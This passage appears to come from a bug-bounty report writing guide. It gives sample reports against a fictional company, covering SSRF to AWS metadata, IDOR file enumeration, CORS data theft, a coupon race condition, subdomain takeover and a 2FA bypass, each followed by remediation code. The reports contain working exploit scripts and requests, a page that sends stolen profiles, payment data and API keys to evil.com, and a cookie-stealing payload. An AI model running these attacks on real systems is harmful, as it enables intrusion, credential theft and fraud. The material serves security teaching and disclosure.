  const cleanSubject = sanitizeHtml(req.body.subject, {
    allowedTags: [],       // No HTML tags allowed
    allowedAttributes: {}  // No attributes allowed
  });
  
  // Store the sanitized version
  db.query('INSERT INTO tickets (subject, ...) VALUES ($1, ...)', [cleanSubject]);
});

// ALSO — Add Content-Security-Policy header
// Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' data:;
```

---

## Report 5 — [HIGH] SSRF via PDF Generation Reaching AWS Metadata

::field-group

  :::field{name="Severity" type="string"}
  :badge[HIGH]{color="orange"} — CVSS 8.6
  :::

  :::field{name="Bounty Awarded" type="string"}
  $7,500
  :::

  :::field{name="Weakness" type="string"}
  CWE-918: Server-Side Request Forgery
  :::

::

### Title

**SSRF in Invoice PDF Generation Allows Access to AWS EC2 Metadata Service — IAM Role Credentials Leaked with S3, RDS, and SES Access**

### Summary

The invoice export feature at `/api/v1/invoices/export` accepts a `logo_url` parameter to embed a custom company logo in the generated PDF. This URL is fetched server-side by the PDF generation library (wkhtmltopdf) without any URL validation or network restrictions. An attacker can set this URL to the **AWS Instance Metadata Service** (`169.254.169.254`) to retrieve IAM role credentials, which provide access to S3 buckets, RDS databases, and SES email services.

### Steps to Reproduce

::steps{level="4"}

#### Step 1 — Identify the SSRF vector

```http
POST /api/v1/invoices/export HTTP/1.1
Host: api.acme-corp.com
Authorization: Bearer eyJhbG...
Content-Type: application/json

{
  "invoice_id": 12345,
  "format": "pdf",
  "logo_url": "https://attacker.com/logo.png"
}
```

Attacker's server log confirms the server-side request:
```
10.0.1.25 - - [16/Mar/2025] "GET /logo.png HTTP/1.1" 200 - "wkhtmltopdf"
```

The request originates from the server's **internal IP** (10.0.1.25).

#### Step 2 — Access AWS metadata service

```http
POST /api/v1/invoices/export HTTP/1.1
Host: api.acme-corp.com
Authorization: Bearer eyJhbG...
Content-Type: application/json

{
  "invoice_id": 12345,
  "format": "pdf",
  "logo_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

The generated PDF contains the text:
```
acme-web-server-role
```

#### Step 3 — Retrieve IAM credentials

```json
{
  "invoice_id": 12345,
  "format": "pdf",
  "logo_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/acme-web-server-role"
}
```

The generated PDF contains:

```json
{
  "Code": "Success",
  "AccessKeyId": "ASIAY3EXAMPLE...",
  "SecretAccessKey": "wJalrXUtnFEMI...",
  "Token": "FwoGZXIvYXdzE...",
  "Expiration": "2025-03-16T20:30:00Z"
}
```

#### Step 4 — Use stolen credentials

```bash
export AWS_ACCESS_KEY_ID="ASIAY3EXAMPLE..."
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI..."
export AWS_SESSION_TOKEN="FwoGZXIvYXdzE..."

# Enumerate access
aws sts get-caller-identity
# Account: 123456789012, Role: acme-web-server-role

aws s3 ls
# 2024-01-15 acme-production-uploads
# 2024-02-20 acme-customer-documents
# 2024-03-01 acme-database-backups     ← Contains DB backups!

aws s3 ls s3://acme-database-backups/
# 2025-03-15 production-backup-2025-03-15.sql.gz (2.4 GB)
```

::

### Impact

- **AWS Credential Theft**: IAM role credentials with access to:
  - **S3**: 12 buckets including `acme-database-backups` with daily production DB dumps
  - **RDS**: Read replica access to the production PostgreSQL database
  - **SES**: Email sending capability (phishing from legitimate domain)
- **Data Breach**: 2.4GB database backup downloadable containing all customer and financial data
- **Internal Network Access**: SSRF can probe internal services (Redis on 10.0.1.30, internal APIs)

### Remediation

1. **Block metadata endpoints**: Configure firewall/iptables to block `169.254.169.254` from the application
2. **Enable IMDSv2**: Require token-based metadata access (blocks SSRF-based extraction)
3. **URL validation**: Implement strict allowlist for `logo_url` — only allow `https://` URLs to known CDN domains
4. **Network isolation**: Run PDF generation in a separate container/Lambda with no network access to internal services
5. **Least privilege**: Reduce IAM role permissions — remove S3 backup bucket access from the web server role

---

## Report 6 — [HIGH] IDOR — Access and Delete Any User's Files

::field-group

  :::field{name="Severity" type="string"}
  :badge[HIGH]{color="orange"} — CVSS 8.1
  :::

  :::field{name="Bounty Awarded" type="string"}
  $4,000
  :::

  :::field{name="Weakness" type="string"}
  CWE-639: Authorization Bypass Through User-Controlled Key
  :::

::

### Title

**IDOR in File Management API Allows Any Authenticated User to Read, Download, and Delete Files Belonging to Any Other User via Predictable Sequential File IDs**

### Summary

The file management API endpoints use sequential integer file IDs without proper authorization checks. Any authenticated user can access, download, and **permanently delete** files belonging to any other user by iterating through file IDs. The API returns the file content along with sensitive metadata including the owner's email address and IP address used for upload.

### Steps to Reproduce

::steps{level="4"}

#### Step 1 — Upload a file as User A and note the file ID

```http
POST /api/v2/files/upload HTTP/1.1
Authorization: Bearer USER_A_TOKEN

# Response:
{"file_id": 94521, "filename": "my_document.pdf", "status": "uploaded"}
```

#### Step 2 — As User B, access User A's file

```http
GET /api/v2/files/94521 HTTP/1.1
Authorization: Bearer USER_B_TOKEN

# Response (200 OK):
{
  "file_id": 94521,
  "filename": "my_document.pdf",
  "size": 245891,
  "owner_email": "usera@example.com",
  "upload_ip": "203.0.113.10",
  "created_at": "2025-03-15T10:30:00Z",
  "download_url": "/api/v2/files/94521/download"
}
```

#### Step 3 — Download User A's file as User B

```bash
curl "https://api.acme-corp.com/api/v2/files/94521/download" \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -o stolen_document.pdf

# File downloaded successfully!
```

#### Step 4 — Delete User A's file as User B

```http
DELETE /api/v2/files/94521 HTTP/1.1
Authorization: Bearer USER_B_TOKEN

# Response (200 OK):
{"message": "File deleted successfully"}
```

User A's file is permanently deleted.

#### Step 5 — Automated enumeration

```python [IDOR File Enumeration]
import requests

TOKEN = "USER_B_TOKEN"
HEADERS = {"Authorization": f"Bearer {TOKEN}"}

for file_id in range(94500, 94530):
    resp = requests.get(
        f"https://api.acme-corp.com/api/v2/files/{file_id}",
        headers=HEADERS
    )
    if resp.status_code == 200:
        data = resp.json()
        print(f"[+] File {file_id}: {data['filename']} "
              f"(Owner: {data['owner_email']}, Size: {data['size']})")
```

**Output:**
```
[+] File 94500: financial_report_Q1.xlsx (Owner: cfo@acme-corp.com, Size: 1248576)
[+] File 94501: employee_salaries.csv (Owner: hr@acme-corp.com, Size: 89421)
[+] File 94503: server_passwords.txt (Owner: sysadmin@acme-corp.com, Size: 2847)
[+] File 94505: contract_draft.docx (Owner: legal@acme-corp.com, Size: 547892)
...
```

::

### Impact

- **Data Breach**: Any authenticated user can read **all files** across the platform (~2.1 million files)
- **Information Disclosure**: Owner email and upload IP leaked with each file
- **Data Destruction**: Any user can **permanently delete** any other user's files (no soft-delete, no recovery)
- **Sensitive Content**: Files include financial reports, contracts, credentials files, and personal documents
- **Compliance**: Violates GDPR Article 5 (data minimization and integrity)

### Remediation

```python [Authorization Fix]
# VULNERABLE
@app.route('/api/v2/files/<int:file_id>')
@login_required
def get_file(file_id):
    file = File.query.get_or_404(file_id)
    return jsonify(file.to_dict())

# FIXED — Authorization check
@app.route('/api/v2/files/<int:file_id>')
@login_required
def get_file(file_id):
    file = File.query.filter_by(
        id=file_id,
        owner_id=current_user.id  # Scope to current user
    ).first_or_404()
    
    return jsonify(file.to_dict())

# ALSO: Use UUIDs instead of sequential integers
# ALSO: Remove owner_email and upload_ip from API response
# ALSO: Implement soft-delete with admin recovery capability
```

---

## Report 7 — [MEDIUM] CORS Misconfiguration Leading to Sensitive Data Exposure

::field-group

  :::field{name="Severity" type="string"}
  :badge[MEDIUM]{color="yellow"} — CVSS 6.5
  :::

  :::field{name="Bounty Awarded" type="string"}
  $1,500
  :::

  :::field{name="Weakness" type="string"}
  CWE-942: Permissive Cross-domain Policy with Untrusted Domains
  :::

::

### Title

**CORS Misconfiguration Reflects Arbitrary Origin with Credentials — Enables Cross-Origin Data Theft of User Profile and Financial Data**

### Summary

The API at `api.acme-corp.com` reflects any `Origin` header value in the `Access-Control-Allow-Origin` response header while also setting `Access-Control-Allow-Credentials: true`. This allows any malicious website to make authenticated cross-origin requests and read the response data, effectively enabling theft of user profile information, financial data, and API tokens.

### Steps to Reproduce

::steps{level="4"}

#### Step 1 — Confirm CORS reflection

```bash
curl -s -D- "https://api.acme-corp.com/api/v2/me" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=VALID_SESSION_COOKIE" \
  | grep -i "Access-Control"

# Response Headers:
# Access-Control-Allow-Origin: https://evil.com     ← REFLECTED!
# Access-Control-Allow-Credentials: true             ← WITH CREDENTIALS!
# Access-Control-Allow-Methods: GET, POST, PUT, DELETE
# Access-Control-Allow-Headers: Content-Type, Authorization
```

#### Step 2 — Confirm with null origin (useful for sandboxed iframes)

```bash
curl -s -D- "https://api.acme-corp.com/api/v2/me" \
  -H "Origin: null" \
  -H "Cookie: session=VALID_SESSION_COOKIE" \
  | grep -i "Access-Control"

# Access-Control-Allow-Origin: null     ← Also reflected!
# Access-Control-Allow-Credentials: true
```

#### Step 3 — Create exploitation page

Host the following HTML on `https://evil.com/steal.html`:

```html
<!DOCTYPE html>
<html>
<head><title>Win a Prize!</title></head>
<body>
<h1>Congratulations! You've won!</h1>
<p>Please wait while we process your prize...</p>

<script>
// Victim visits this page while logged into acme-corp.com

// Steal profile data
fetch('https://api.acme-corp.com/api/v2/me', {
  credentials: 'include'  // Send cookies cross-origin
})
.then(r => r.json())
.then(data => {
  console.log('Stolen profile:', data);
  
  // Exfiltrate to attacker
  fetch('https://evil.com/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      type: 'profile',
      data: data
    })
  });
});

// Steal financial data
fetch('https://api.acme-corp.com/api/v2/me/payment-methods', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://evil.com/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      type: 'payment_methods',
      data: data
    })
  });
});

// Steal API tokens
fetch('https://api.acme-corp.com/api/v2/me/api-keys', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://evil.com/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      type: 'api_keys',
      data: data
    })
  });
});

// Modify victim's email (action on behalf of victim)
fetch('https://api.acme-corp.com/api/v2/me', {
  method: 'PUT',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
</body>
</html>
```

#### Step 4 — Victim visits `evil.com/steal.html`

All data is silently sent to the attacker's server.

::

### Proof of Concept

```
Attacker's server log after victim visits the page:

[2025-03-16 15:42:01] POST /collect - profile
  {"id": 847291, "name": "Jane Doe", "email": "jane@example.com", 
   "phone": "+1-555-0142", "address": "456 Oak Lane, SF, CA 94102"}

[2025-03-16 15:42:01] POST /collect - payment_methods
  [{"type": "visa", "last_four": "4242", "expiry": "12/2027"},
   {"type": "mastercard", "last_four": "8888", "expiry": "06/2026"}]

[2025-03-16 15:42:02] POST /collect - api_keys
  [{"key": "ak_live_xR4k9mN2...", "created": "2024-11-20"}]
```

### Impact

- Any user who visits an attacker-controlled page has their **profile, payment methods, and API keys stolen**
- Attacker can **modify the victim's account** (change email, password, settings)
- **No user interaction** required beyond visiting the page (no clicks, no forms)
- Attack can be distributed via **social media links**, **ads**, **forum posts**, or **email**

### Remediation

```python [CORS Fix]
# VULNERABLE — Reflects any origin
@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin', '')
    response.headers['Access-Control-Allow-Origin'] = origin  # DANGEROUS!
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

# FIXED — Explicit allowlist
ALLOWED_ORIGINS = {
    'https://www.acme-corp.com',
    'https://portal.acme-corp.com',
    'https://admin.acme-corp.com'
}

@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin', '')
    
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    # If origin is not in allowlist, no CORS headers are set (browser blocks the request)
    
    return response
```

---

## Report 8 — [MEDIUM] Race Condition in Coupon Redemption

::field-group

  :::field{name="Severity" type="string"}
  :badge[MEDIUM]{color="yellow"} — CVSS 6.5
  :::

  :::field{name="Bounty Awarded" type="string"}
  $2,000
  :::

  :::field{name="Weakness" type="string"}
  CWE-362: Race Condition
  :::

::

### Title

**Race Condition in Single-Use Coupon Redemption API Allows Unlimited Application of One-Time Discount Codes — Financial Loss**

### Summary

The coupon redemption endpoint at `/api/v1/cart/apply-coupon` is vulnerable to a **race condition** (TOCTOU — Time of Check to Time of Use). By sending multiple concurrent requests to apply a single-use coupon code, the coupon is applied **multiple times** before the "used" flag is set in the database. A 100% discount coupon (`WELCOME100`) can be stacked to create negative balances, effectively generating store credit or free orders.

### Steps to Reproduce

::steps{level="4"}

#### Step 1 — Obtain a single-use 50% off coupon

The coupon `SAVE50` provides a one-time 50% discount. Normal behavior:

```http
# First application (works)
POST /api/v1/cart/apply-coupon HTTP/1.1
{"coupon_code": "SAVE50"}
# Response: {"discount": "50%", "new_total": 50.00}

# Second application (rejected)
POST /api/v1/cart/apply-coupon HTTP/1.1
{"coupon_code": "SAVE50"}
# Response: {"error": "Coupon already used"}
```

#### Step 2 — Send 20 concurrent requests

```python [Race Condition Exploit]
import requests
import threading
import time

TARGET = "https://api.acme-corp.com/api/v1/cart/apply-coupon"
TOKEN = "Bearer eyJhbG..."
COUPON = "SAVE50"

results = []

def apply_coupon(thread_id):
    resp = requests.post(TARGET,
        json={"coupon_code": COUPON},
        headers={"Authorization": TOKEN}
    )
    results.append({
        "thread": thread_id,
        "status": resp.status_code,
        "body": resp.json()
    })

# Create 20 threads
threads = []
for i in range(20):
    t = threading.Thread(target=apply_coupon, args=(i,))
    threads.append(t)

# Start all threads simultaneously
print("[*] Sending 20 concurrent requests...")
for t in threads:
    t.start()

for t in threads:
    t.join()

# Count successful applications
success = sum(1 for r in results if r['status'] == 200 and 'error' not in r['body'])
print(f"\n[+] Coupon applied successfully {success} times!")
print(f"[+] Expected: 1 time (single-use coupon)")

for r in results:
    if r['status'] == 200 and 'error' not in r['body']:
        print(f"  Thread {r['thread']}: {r['body']}")
```

**Output:**
```
[*] Sending 20 concurrent requests...

[+] Coupon applied successfully 7 times!
[+] Expected: 1 time (single-use coupon)
  Thread 2:  {"discount": "50%", "new_total": 50.00}
  Thread 5:  {"discount": "50%", "new_total": 25.00}
  Thread 8:  {"discount": "50%", "new_total": 12.50}
  Thread 11: {"discount": "50%", "new_total": 6.25}
  Thread 14: {"discount": "50%", "new_total": 3.13}
  Thread 17: {"discount": "50%", "new_total": 1.56}
  Thread 19: {"discount": "50%", "new_total": 0.78}
```

The original $100.00 order was reduced to **$0.78** using a single-use 50% coupon applied 7 times.

#### Step 3 — Verify with Turbo Intruder (Burp Suite)

```python [Turbo Intruder Script]
# Burp Suite Turbo Intruder — race.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=20,
                          requestsPerConnection=1,
                          pipeline=False)
    
    for i in range(20):
        engine.queue(target.req, gate='race1')
    
    engine.openGate('race1')  # Release all requests simultaneously

def handleResponse(req, interesting):
    table.add(req)
```

::

### Impact

- **Financial Loss**: Attackers can purchase products for near-zero cost
- **Coupon Abuse**: Single-use coupons can be stacked indefinitely
- **Referral Abuse**: Referral credit coupons can be multiplied
- **Estimated Impact**: ~$50,000/month in potential losses based on coupon usage patterns

### Remediation

```python [Race Condition Fix]
# VULNERABLE — Check-then-act without locking
def apply_coupon(coupon_code, user_id, cart_id):
    coupon = db.query("SELECT * FROM coupons WHERE code = %s", coupon_code)
    
    if coupon.used:  # CHECK
        return {"error": "Coupon already used"}
    
    # GAP — Race window here!
    
    apply_discount(cart_id, coupon.discount)
    db.query("UPDATE coupons SET used = true WHERE code = %s", coupon_code)  # ACT
    
    return {"discount": coupon.discount}

# FIXED — Atomic operation with database lock
def apply_coupon(coupon_code, user_id, cart_id):
    with db.transaction():
        # SELECT FOR UPDATE acquires a row-level lock
        coupon = db.query(
            "SELECT * FROM coupons WHERE code = %s FOR UPDATE",
            coupon_code
        )
        
        if not coupon or coupon.used:
            return {"error": "Coupon already used"}
        
        # Mark as used BEFORE applying discount
        db.query(
            "UPDATE coupons SET used = true, used_by = %s, used_at = NOW() WHERE code = %s",
            user_id, coupon_code
        )
        
        apply_discount(cart_id, coupon.discount)
        
    return {"discount": coupon.discount}
```

---

## Report 9 — [MEDIUM] Subdomain Takeover via Dangling CNAME

::field-group

  :::field{name="Severity" type="string"}
  :badge[MEDIUM]{color="yellow"} — CVSS 6.1
  :::

  :::field{name="Bounty Awarded" type="string"}
  $1,000
  :::

  :::field{name="Weakness" type="string"}
  CWE-284: Improper Access Control
  :::

::

### Title

**Subdomain Takeover on `staging-docs.acme-corp.com` via Dangling CNAME to Unclaimed GitHub Pages — Cookie Theft and Phishing Possible**

### Summary

The subdomain `staging-docs.acme-corp.com` has a CNAME record pointing to `acme-corp.github.io`, which no longer exists. An attacker can claim this GitHub Pages hostname and serve arbitrary content on `staging-docs.acme-corp.com`. Since the parent domain `acme-corp.com` sets cookies with `Domain=.acme-corp.com`, the attacker's page can **read session cookies** set by the main application, enabling session hijacking.

### Steps to Reproduce

::steps{level="4"}

#### Step 1 — Discover the dangling CNAME

```bash
dig CNAME staging-docs.acme-corp.com +short
# acme-corp.github.io.

curl -s https://staging-docs.acme-corp.com
# Error: 404 — There isn't a GitHub Pages site here.
```

#### Step 2 — Claim the GitHub Pages hostname

1. Create a GitHub repository named `acme-corp.github.io`
2. Enable GitHub Pages in repository settings
3. Add `staging-docs.acme-corp.com` as a custom domain in the repository settings
4. Create `CNAME` file in the repository containing `staging-docs.acme-corp.com`

#### Step 3 — Upload proof-of-concept page

```html
<!-- index.html in the attacker's GitHub Pages repo -->
<!DOCTYPE html>
<html>
<head><title>ACME Documentation</title></head>
<body>
<h1>Subdomain Takeover — Proof of Concept</h1>
<p>This page is served from staging-docs.acme-corp.com</p>
<p>Controlled by: security-researcher (via GitHub Pages)</p>
<p>Session cookies visible to this page:</p>
<pre id="cookies"></pre>
<script>
  document.getElementById('cookies').textContent = document.cookie;
  // If acme-corp.com sets cookies with Domain=.acme-corp.com,
  // they are accessible here!
</script>
</body>
</html>
```

#### Step 4 — Verify takeover

```bash
curl -s https://staging-docs.acme-corp.com
# Returns our proof-of-concept page!
```

::

### Impact

- **Cookie Theft**: If parent domain sets cookies with `Domain=.acme-corp.com`, the attacker page can read them
- **Phishing**: Attacker can create a convincing login page on the legitimate subdomain
- **Malware**: Serve malicious downloads from a trusted domain
- **SEO Poisoning**: Inject content that affects the parent domain's search ranking
- **Email Spoofing**: May enable SPF bypass if subdomain is included in DNS SPF records

### Remediation

1. **Immediately**: Remove the CNAME record for `staging-docs.acme-corp.com`
2. **Audit**: Check all DNS records for other dangling CNAMEs
3. **Monitor**: Implement automated monitoring for subdomain takeover vulnerabilities (use tools like `subjack`, `nuclei`)
4. **Cookies**: Set cookies with specific domain instead of wildcard (`.acme-corp.com`)
5. **DNS Hygiene**: Implement a process to remove DNS records when decommissioning services

```bash
# Quick audit for dangling CNAMEs
for sub in $(cat subdomains.txt); do
  cname=$(dig +short CNAME $sub 2>/dev/null)
  if [ ! -z "$cname" ]; then
    status=$(curl -s -o /dev/null -w "%{http_code}" "http://$sub" 2>/dev/null)
    if [ "$status" == "404" ] || [ "$status" == "000" ]; then
      echo "[VULNERABLE] $sub -> $cname (HTTP $status)"
    fi
  fi
done
```

---

## Report 10 — [MEDIUM] 2FA Bypass via Response Manipulation

::field-group

  :::field{name="Severity" type="string"}
  :badge[MEDIUM]{color="yellow"} — CVSS 7.4
  :::

  :::field{name="Bounty Awarded" type="string"}
  $3,000
  :::

  :::field{name="Weakness" type="string"}
  CWE-287: Improper Authentication
  :::

::

### Title

**Two-Factor Authentication Bypass via Client-Side Response Manipulation — Server Trusts Client-Side 2FA Verification Status**

### Summary

The two-factor authentication (2FA) implementation can be bypassed by modifying the server response from the 2FA verification endpoint. When a user submits an incorrect OTP code, the server returns `{"success": false, "message": "Invalid code"}`. By intercepting this response with a proxy and changing it to `{"success": true}`, the client-side application accepts the response and grants full access to the account **without a valid OTP code**.

### Steps to Reproduce

::steps{level="4"}

#### Step 1 — Log in with valid username and password

```http
POST /api/v1/auth/login HTTP/1.1
Content-Type: application/json

{"email": "victim@example.com", "password": "correct_password"}

# Response:
{"status": "2fa_required", "temp_token": "tmp_abc123..."}
```

#### Step 2 — Submit an incorrect 2FA code and intercept the response

```http
POST /api/v1/auth/verify-2fa HTTP/1.1
Content-Type: application/json

{"temp_token": "tmp_abc123...", "otp_code": "000000"}

# Original Server Response:
{"success": false, "message": "Invalid verification code"}
```

#### Step 3 — Modify the response in Burp Suite

In **Burp Suite → Proxy → Intercept Response to this request**:

Change:
```json
{"success": false, "message": "Invalid verification code"}
```

To:
```json
{"success": true, "token": "bypass"}
```

#### Step 4 — Application grants full access

The client-side JavaScript checks only the `success` field in the response:

```javascript
// Vulnerable client-side code (from app.js):
async function verify2FA(code) {
  const response = await fetch('/api/v1/auth/verify-2fa', {
    method: 'POST',
    body: JSON.stringify({temp_token: tempToken, otp_code: code})
  });
  
  const data = await response.json();
  
  if (data.success) {    // <-- Only checks client-side response!
    window.location = '/dashboard';  // Redirect to authenticated area
  } else {
    showError(data.message);
  }
}
```

After the response modification, the browser redirects to `/dashboard` and the user has full access without a valid OTP.

::

::warning
The actual session/authentication token must also be examined. In this case, the `temp_token` issued after password authentication was sufficient to make authenticated API calls — the 2FA verification was purely a **client-side gate** with no server-side enforcement on subsequent requests.
::

### Impact

- **2FA Bypass**: Complete bypass of two-factor authentication
- **Account Takeover**: If attacker has the user's password (phishing, credential stuffing), 2FA provides no protection
- **Affects All 2FA Users**: Every user with 2FA enabled (~340,000 users) is affected
- **Compliance**: Fails PCI-DSS requirement 8.3 for multi-factor authentication

### Remediation

```python [Server-Side 2FA Enforcement]
# VULNERABLE — Client-side 2FA gate
@app.route('/api/v1/auth/verify-2fa', methods=['POST'])
def verify_2fa():
    token = request.json.get('temp_token')
    code = request.json.get('otp_code')
    
    user = verify_temp_token(token)
    if verify_otp(user, code):
        return jsonify({"success": True})  # Client decides what to do
    return jsonify({"success": False, "message": "Invalid code"})

# FIXED — Server-side enforcement
@app.route('/api/v1/auth/verify-2fa', methods=['POST'])
def verify_2fa():
    token = request.json.get('temp_token')
    code = request.json.get('otp_code')
    
    user = verify_temp_token(token)
    if not verify_otp(user, code):
        return jsonify({"error": "Invalid code"}), 401
    
    # Server issues the REAL session token only after 2FA passes
    session_token = create_session(user, mfa_verified=True)
    return jsonify({
        "token": session_token,
        "expires_in": 3600
    })

# ALSO: Mark temp_token as "not fully authenticated"
# All API endpoints must check: session.mfa_verified == True
@app.before_request
def check_mfa():
    if requires_auth(request.endpoint):
        session = get_session(request.headers.get('Authorization'))
        if not session or not session.mfa_verified:
            abort(401, "MFA verification required")
```

---

## Report Writing Guide

### The Anatomy of a Great Report

::tip
Reports that follow these principles consistently receive **higher bounties** and **faster triage times**.
::

::accordion

  :::accordion-item
  ---
  icon: i-lucide-heading
  label: "1. Title — Be Specific and Impactful"
  ---
  **Bad titles:**
  - ❌ "XSS Found"
  - ❌ "SQL Injection"
  - ❌ "Bug in Login"
  - ❌ "Security Issue"

  **Good titles:**
  - ✅ "Stored XSS in Product Review Comments Executes in Admin Dashboard Leading to Admin Account Takeover"
  - ✅ "Blind SQL Injection in Order Search API Allows Extraction of 3.2M Customer Records Including Payment Data"
  - ✅ "Authentication Bypass via Predictable Password Reset Tokens (MD5 of email+timestamp) — Full Account Takeover"

  **Formula:** `[Vulnerability Type] in [Component/Endpoint] [via Method] — [Maximum Impact]`
  :::

  :::accordion-item
  ---
  icon: i-lucide-file-text
  label: "2. Summary — Write for the Triage Analyst"
  ---
  The triage analyst reads **hundreds of reports daily**. Your summary should answer three questions in **2-3 sentences**:

  1. **What** is the vulnerability?
  2. **Where** is it?
  3. **Why** does it matter (impact)?

  **Bad:**
  > I found an XSS bug on your website. Please fix it.

  **Good:**
  > A stored cross-site scripting vulnerability exists in the support ticket subject field (`POST /api/v1/support/tickets`, `subject` parameter). User-supplied HTML/JavaScript is rendered without sanitization in the admin support dashboard at `/admin/tickets`. This allows any authenticated user to execute JavaScript in an admin's browser session, enabling admin cookie theft and complete admin account takeover.
  :::

  :::accordion-item
  ---
  icon: i-lucide-list-ordered
  label: "3. Steps to Reproduce — Be Exact"
  ---
  **Rules:**
  - Number every step
  - Include **every** HTTP request with full headers
  - Specify exact URLs, parameters, and values
  - Include screenshots for visual steps
  - Assume the reader has **zero context**
  - A fresh tester should reproduce it on the **first attempt**

  **Bad:**
  > 1. Go to the search page
  > 2. Type some SQL
  > 3. See the error

  **Good:**
  > 1. Navigate to `https://app.acme-corp.com/search`
  > 2. In the search bar, enter: `laptop' AND 1=1--`
  > 3. Click the "Search" button
  > 4. Observe that search results are returned normally
  > 5. Now enter: `laptop' AND 1=2--`
  > 6. Observe that NO results are returned
  > 7. The differing responses confirm boolean-based blind SQL injection
  > 8. To verify with time-based: enter `laptop' AND (SELECT pg_sleep(5))--`
  > 9. Observe the response takes ~5 seconds (confirming PostgreSQL)
  :::

  :::accordion-item
  ---
  icon: i-lucide-zap
  label: "4. Impact — Show Maximum Realistic Impact"
  ---
  Don't just describe the vulnerability — describe the **worst realistic scenario**.

  **Bad:**
  > An attacker can execute JavaScript.

  **Good:**
  > An attacker can:
  > 1. **Steal admin session cookies** by injecting `fetch('https://evil.com?c='+document.cookie)` — confirmed that cookies are sent cross-origin
  > 2. **Take over any admin account** by using the stolen session to change the admin's email and trigger a password reset
  > 3. **Access all customer data** through the admin panel (confirmed 2.3M customer records visible)
  > 4. **Modify application configuration** through the admin settings panel
  > 5. **Create additional backdoor admin accounts** for persistent access
  >
  > The XSS payload executes automatically when any admin views the ticket list — no additional clicks required. With ~47 active admin users, exploitation is highly likely within 24 hours of payload injection.
  :::

  :::accordion-item
  ---
  icon: i-lucide-gauge
  label: "5. Severity — Use CVSS Correctly"
  ---
  Always include a **CVSS v3.1 vector string** and score. Use the [FIRST CVSS Calculator](https://www.first.org/cvss/calculator/3.1).

  | Metric | What to Consider |
  |--------|-----------------|
  | **Attack Vector (AV)** | Network (remote), Adjacent, Local, Physical |
  | **Attack Complexity (AC)** | Low (easy), High (requires specific conditions) |
  | **Privileges Required (PR)** | None, Low (authenticated), High (admin) |
  | **User Interaction (UI)** | None (automatic), Required (victim must click) |
  | **Scope (S)** | Unchanged (same component), Changed (impacts other components) |
  | **Confidentiality (C)** | None, Low (partial data), High (all data) |
  | **Integrity (I)** | None, Low (partial modification), High (full modification) |
  | **Availability (A)** | None, Low (degraded), High (complete DoS) |

  **Pro tip:** Don't over-inflate severity. Inflated CVSS scores damage your credibility. Be honest and accurate — triagers appreciate it.
  :::

  :::accordion-item
  ---
  icon: i-lucide-video
  label: "6. Proof of Concept — Show, Don't Just Tell"
  ---
  **Evidence hierarchy (best to worst):**

  1. 🏆 **Video recording** — Screen recording of full exploitation chain
  2. 🥇 **Working exploit code** — Script that reproduces the vulnerability
  3. 🥈 **HTTP requests/responses** — Full Burp Suite request/response pairs
  4. 🥉 **Screenshots** — Annotated screenshots of key evidence
  5. 📝 **Descriptions** — Written explanation (weakest — avoid if possible)

  **Tips:**
  - Use `curl` commands that can be copy-pasted
  - Include the **full HTTP request and response** (not just the payload)
  - For XSS: Show the alert box AND the cookie theft
  - For SQLi: Show data extraction, not just `' OR '1'='1`
  - For SSRF: Show internal data access, not just `HTTP 200`
  - Annotate screenshots with arrows and labels
  :::

::

### Common Mistakes to Avoid

::warning
Avoid these mistakes that lead to **report closure**, **N/A (Not Applicable)**, or **reduced payouts**.
::

| Mistake | Result | How to Avoid |
|---------|--------|-------------|
| Submitting self-XSS | Closed as N/A | Confirm the XSS affects OTHER users |
| No reproduction steps | Needs More Info → delayed payout | Write numbered steps anyone can follow |
| Inflated severity | Reduced bounty, damaged reputation | Use CVSS calculator accurately |
| Duplicate report | Closed as Duplicate | Search for similar reports first |
| Missing impact | Lower bounty | Always explain the worst realistic impact |
| Reporting best practices as vulns | Closed as Informational | Missing headers alone rarely qualify |
| Testing on other users' accounts | Policy violation / ban | Only test on your OWN test accounts |
| Automated scanner output only | Closed / reduced bounty | Manually verify and create PoC |
| Reporting out-of-scope targets | Closed | Read the program policy carefully |
| Being rude to triagers | Reputation damage | Be professional and patient |

### Response Handling

::tabs
  :::tabs-item{icon="i-lucide-message-circle" label="Handling Triage Questions"}
  ```markdown
  # When triager asks for more info:
  
  Hi [triager name],
  
  Thank you for reviewing my report. Here are the additional details you requested:
  
  **[Answer their specific question with full technical detail]**
  
  I've also attached:
  - Updated screenshot showing [specific evidence]
  - curl command that reproduces the issue: `curl -X POST...`
  - Video recording of the full exploitation chain
  
  Please let me know if you need any further clarification.
  
  Best regards,
  [Your name]
  ```
  :::

  :::tabs-item{icon="i-lucide-alert-triangle" label="Handling Disputes"}
  ```markdown
  # When you disagree with severity rating:
  
  Hi [triager name],
  
  Thank you for your assessment. I'd like to respectfully provide 
  additional context regarding the severity:
  
  The current rating is [MEDIUM], but I believe [HIGH] is more appropriate
  because:
  
  1. **No authentication required**: The vulnerability is exploitable by 
     unauthenticated users (CVSS PR:N)
  2. **No user interaction**: Exploitation is automatic (CVSS UI:N)
  3. **Full data access**: The attacker gains access to ALL customer 
     records, not just partial data (CVSS C:H)
  
  CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5 (HIGH)
  
  Similar vulnerabilities on other programs have been rated as HIGH:
  - [Link to similar disclosed report]
  - [Link to OWASP classification]
  
  I appreciate your time and look forward to your reassessment.
  
  Best regards,
  [Your name]
